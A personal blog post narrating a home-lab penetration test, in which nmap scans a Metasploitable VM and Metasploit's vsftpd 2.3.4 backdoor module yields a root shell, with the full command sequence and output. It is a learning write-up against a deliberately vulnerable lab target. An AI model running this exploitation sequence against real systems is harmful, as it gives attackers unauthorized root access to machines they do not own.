<!--hacking, metasploit, ftp-->
# Let's hack stuff!

First and fore most, long time no see. The last couple of months flew by and I haven't really been in the mood of writing. 
Now I stated experimenting with Kali again and figured I might as well document it.

## The environment

I have set up a Kali VM - the atacker - and a Metasploitable VM - the target - in VirtualBox, that I will be using in this post. 
Kali is a Linux distro designed for hacking/pentesting and is loaded with tools. Metasploitable is an Ubuntu VM loaded with poorly 
configured applications that are easily hackable. I will post installation instructions in a future post, but most of it is dead 
simple and easily found online already. 

## The hack

This is a very simple exploit and took about ten minutes. The write up took significantly longer!

### Scanning the network

So after I have fired up my VMs I open the attacking machine and start a terminal. The first thing I want to do is find out where my 
target is so I turn to `nmap` and run (result edited):

    # nmap  192.168.56.0/24

    Nmap scan report for 192.168.56.103
    Host is up (0.00013s latency).
    Not shown: 977 closed ports
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    23/tcp   open  telnet
    25/tcp   open  smtp
    53/tcp   open  domain
    80/tcp   open  http
    111/tcp  open  rpcbind
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    512/tcp  open  exec
    513/tcp  open  login
    514/tcp  open  shell
    1099/tcp open  rmiregistry
    1524/tcp open  ingreslock
    2049/tcp open  nfs
    2121/tcp open  ccproxy-ftp
    3306/tcp open  mysql
    5432/tcp open  postgresql
    5900/tcp open  vnc
    6000/tcp open  X11
    6667/tcp open  irc
    8009/tcp open  ajp13
    8180/tcp open  unknown
 
I can identify the target by the loads of open ports. This is a virtual network so there are no other machines on the network, this 
makes finding the target easier than it would be in the wild. In a real life scenario you would have to do some research in order 
to know what machine you should target.

Now that we have our target, `192.168.56.103` we can do a more advanced scan:

    # nmap -sV -O -p1-65535 192.168.56.103 > target
    
This will scan all the ports (`-p1-65535`) of particular machine, it will also try to detect the OS (`-O`) and further more it will try
to identify what versions the software listening to each open port are running (`-sV`). I save this to a file called `target` 
since I like to reference the scan later on.

In this excercise I am only interested in the fisrt service running on port 21, the second scan returns the following:

    21/tcp open  ftp     vsftpd 2.3.4

We now have a bit more information about our target. We know the application name and version number, this will help us find an exploit.

### Finding an exploit

There are two things we can do now, either scan the machine with a vulnerability scanner or search for an exploit manually. 
I decided to do a quick manual search and launch a vulnerability scanner if I didn't get quick results. 

Metasploit is our friend here so I launch it with `#msfconsole` and do the following:

    msf > search vsftpd

    Matching Modules
    ================

       Name                                  Disclosure Date  Rank       Description
       ----                                  ---------------  ----       -----------
       exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution

Jackpot! We found a vulnerability with an excellent rating that affects the exact version our target is running. 
Let's find out more, again the output is edited for brevity.

    msf> info exploit/unix/ftp/vsftpd_234_backdoor 
    
    Name: VSFTPD v2.3.4 Backdoor Command Execution
    Module: exploit/unix/ftp/vsftpd_234_backdoor
    Platform: Unix
    Privileged: Yes
    License: Metasploit Framework License (BSD)
    Rank: Excellent
    Disclosed: 2011-07-03

    Description:
      This module exploits a malicious backdoor that was added to the 
      VSFTPD download archive. This backdoor was introduced into the 
      vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
      according to the most recent information available. This backdoor 
      was removed on July 3rd 2011.

This sounds really juicy so I will try it out. First I pick the exploit and show all options for it:

    msf > use exploit/unix/ftp/vsftpd_234_backdoor 
    msf exploit(vsftpd_234_backdoor) > show options

    Module options (exploit/unix/ftp/vsftpd_234_backdoor):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       RHOST                   yes       The target address
       RPORT  21               yes       The target port


    Exploit target:

       Id  Name
       --  ----
       0   Automatic

This tells me that I need to set the target, denoted by RHOST. I set it and show all available payloads:

    msf exploit(vsftpd_234_backdoor) > set RHOST 192.168.56.103
    RHOST => 192.168.56.103
    msf exploit(vsftpd_234_backdoor) > show payloads

    Compatible Payloads
    ===================

       Name               Disclosure Date  Rank    Description
       ----               ---------------  ----    -----------
       cmd/unix/interact                   normal  Unix Command, Interact with Established Connection

There is only a single payload available so I select that and launch my attack!


    msf exploit(vsftpd_234_backdoor) > set payload cmd/unix/interact 
    payload => cmd/unix/interact
    msf exploit(vsftpd_234_backdoor) > exploit

    [*] Banner: 220 (vsFTPd 2.3.4)
    [*] USER: 331 Please specify the password.
    [+] Backdoor service has been spawned, handling...
    [+] UID: uid=0(root) gid=0(root)
    [*] Found shell.
    [*] Command shell session 1 opened (192.168.56.104:33322 -> 192.168.56.103:6200) at 2014-11-12 13:45:57 -0500

Succes we have a shell, and as an added bonus:

    whoami
    root
    
### Summary

This exploit was a very simple challenge and I could execute it with very simple tools. 
Hopefully the next service (SSH running on port 22) will be a little tougher.
